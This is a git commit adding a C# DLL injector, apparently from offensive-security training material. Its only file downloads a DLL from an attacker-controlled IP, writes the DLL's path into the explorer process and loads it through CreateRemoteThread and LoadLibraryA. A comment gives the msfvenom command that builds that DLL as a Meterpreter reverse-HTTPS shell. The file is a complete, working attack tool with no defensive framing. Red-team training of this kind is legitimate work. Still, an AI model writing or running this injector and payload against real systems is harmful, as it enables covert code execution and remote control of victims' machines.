da1f5078a653445a820351b9bbf0e0103aea6320
n0isegat3 <jan@cyber-rangers.com>
2022-01-27 20:53:47 +0100

    dll injector

---
+++ 006-DLLInjection/n0iseDLLInjector/Program.cs
@@ -0,0 +1,58 @@
+﻿using System;
+using System.Text;
+using System.Net;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+namespace n0iseDLLInjector
+{
+    internal class Program
+    {
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int
+processId);
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint
+        dwSize, uint flAllocationType, uint flProtect);
+        [DllImport("kernel32.dll")]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
+        byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr
+        lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint
+        dwCreationFlags, IntPtr lpThreadId);
+        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true,
+        SetLastError = true)]
+        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
+        public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        static void Main(string[] args)
+        {
+            //download dll to local disk, prepare dll using msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.113 LPORT=443 -f dll -o /var/www/html/met.dll
+            String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+            String dllName = dir + "\\met.dll";
+
+            WebClient wc = new WebClient();
+            wc.DownloadFile("http://10.10.10.113/met.dll", dllName); //change the URL
+
+            //prep process
+            String procName = "explorer"; //change the procName
+            Process[] expProc = Process.GetProcessesByName(procName);
+            int pid = expProc[0].Id;
+            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
+
+            //allocate mem
+            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x4);
+            IntPtr outSize;
+            Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName),
+            dllName.Length, out outSize);
+
+            //locate address
+            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
+
+            //create remote thread
+            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0,IntPtr.Zero);
+        }
+    }
+}
